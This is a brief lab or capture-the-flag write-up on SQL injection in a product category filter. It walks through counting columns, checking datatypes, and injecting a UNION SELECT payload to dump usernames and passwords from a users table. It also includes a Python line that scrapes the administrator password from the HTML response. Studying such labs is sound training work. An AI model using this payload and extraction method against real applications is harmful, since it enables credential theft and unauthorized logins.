SQLi Injection--- Product Category Filter

End Goal: Output the usernames and passwords in the users table and login as the administrator usernames

Analysis:
First Determine the number of columns using ORDER BY CLAUSE--- WE FOUND THERE ARE TWO COLUMNS
Next Determine the datatype of the columns-- VERIFIED THAT BOTH THE COLUMNS ARE OF VARIABLE datatype.

Now use the query #'union select username, password from users--

In the script we look at the get response it is like below
                           <th>administrator</th>
                            <td>13w50okososhdd9tn3s9</td>

So we have to look for administrator text in response body navigate to its parent findNext which is td and its content
admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
